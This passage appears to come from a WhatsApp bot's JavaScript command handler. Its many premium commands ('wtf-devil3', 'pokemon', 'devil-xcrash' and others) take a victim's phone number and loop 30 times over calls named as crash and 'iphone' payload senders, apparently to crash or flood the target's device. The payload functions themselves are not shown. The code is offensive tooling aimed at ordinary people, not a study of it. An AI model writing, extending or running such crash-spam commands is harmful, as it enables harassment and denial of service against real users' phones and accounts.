await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
case 'wtf-devil3': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
case 'wtf-devil5': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
case 'wtf-devil4': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
case 'enter-wtf': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
case 'wtf-devil2': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
case 'anggazyy-go': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
case 'pokemon': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
case 'elania-strong': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
case 'devil-xcrash': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
// GAUSAH DI RECODE YAAAA APALGI LU RENAME 😂😂😂😂
case 'devil-strong': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
